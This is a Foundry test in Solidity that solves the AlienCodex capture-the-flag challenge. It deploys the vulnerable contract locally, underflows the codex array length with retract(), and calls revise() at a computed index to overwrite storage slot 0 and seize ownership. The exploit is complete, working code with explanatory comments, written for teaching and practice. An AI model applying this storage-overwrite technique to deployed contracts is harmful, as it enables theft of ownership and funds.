// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract AlienCodexExploit is Test {
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {}

  function testExploit() public {
    // The AlienCodex contract requires solidity version ^0.5.0 but forge-std only supports >0.6.2.
    // Here is a dirty hack to deploy the contract with a greater solidity version.
    // Note: it should run in the same function as the exploit, not in the `setUp` function.
    vm.startPrank(deployer);
    bytes memory bytecode = abi.encodePacked(
      vm.getCode('./out/AlienCodex.sol/AlienCodex.json')
    );
    address target;
    assembly {
      target := create(0, add(bytecode, 0x20), mload(bytecode))
    }
    console2.log('Target contract deployed');
    vm.stopPrank();

    // Check that the current owner is the deployer.
    (bool success, bytes memory returnData) = address(target).call(
      abi.encodeWithSignature('owner()')
    );
    assertTrue(success);
    address owner;
    if (returnData.length > 0) {
      owner = address(
        uint160(bytes20(uint160(uint256(bytes32(returnData)) << 0)))
      );
      //owner = abi.decode(returnData, (address));
    }
    assertEq(owner, deployer);
    console2.log('Current owner: %s', owner);

    // Perform the exploit.
    // The AlienCodex contract inherits the storage of the Ownable contract.

    // The Ownable contract has the following storage layout:
    // - slot0: address private _owner

    // The AlienCodex contract has thus the following storage layout:
    // - slot0: address private _owner (Ownable storage) -> 20 bytes
    // - slot0: bool public contact -> 1 byte
    // - slot1: length of the bytes32[] public codex dynamic array
    // - slot keccak256(1): first element of the array
    // - slot keccak256(2): second element of the array
    // ...

    // Here is an example:
    // - slot0: 0x7f1234567890123456789012345678901234567890000000000000000000000001
    // with address private owner: 0x7f123456789012345678901234567890123456789.
    // and bool public contact: 0x01 (padded with zeros).
    // - slot1: 0x0000000000000000000000000000000000000000000000000000000000000003
    // which represents the length of the array: 3
    // - slot keccak256(slot_number) or slot keccak256(1)=0xa5f3...: 0x1111111111111111111111111111111111111111111111111111111111111111 (random 32-byte value)
    // - slot keccak256(1)+1: 0x2222222222222222222222222222222222222222222222222222222222222222
    // - slot keccak256(1)+2: 0x3333333333333333333333333333333333333333333333333333333333333333

    // The goal is to use the `retract` method to reduce the size of the dynamic
    // array to modify the slot0 value (owner).
    vm.startPrank(exploiter);
    // Make contact to be able to pass the `contacted` modifier.
    (success, ) = address(target).call(
      abi.encodeWithSignature('makeContact()')
    );
    assertTrue(success);

    // The codex array is empty, thus codex.length is equal to zero.
    // Since we are using solidity ^0.5.0, we can trigger an underflow by substracting one from zero.
    (success, ) = address(target).call(abi.encodeWithSignature('retract()')); // codex.length is now equal to 2^256 - 1.
    assertTrue(success);

    // The codex dynamic array can now be used to access any variables stored in the contract.
    // codex[0] refers to slot keccak256(1)
    // codex[1] refers to slot keccak256(1)+1
    // codex[2^256 - 1 - uint(keccak256(1))] refers to slot 2^256 - 1
    // codex[2^256 - 1 - uint(keccak256(1)) + 1] refers to slot 0
    uint256 index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
    (success, ) = address(target).call(
      abi.encodeWithSignature(
        'revise(uint256,bytes32)',
        index,
        bytes32(uint256(uint160(exploiter)))
      )
    );
    assertTrue(success);
    vm.stopPrank();

    // Check that the new owner is the exploiter.
    (success, returnData) = address(target).call(
      abi.encodeWithSignature('owner()')
    );
    assertTrue(success);
    if (returnData.length > 0) {
      owner = abi.decode(returnData, (address));
    }
    assertEq(owner, exploiter);
    console2.log('New owner: %s', owner);
  }
}
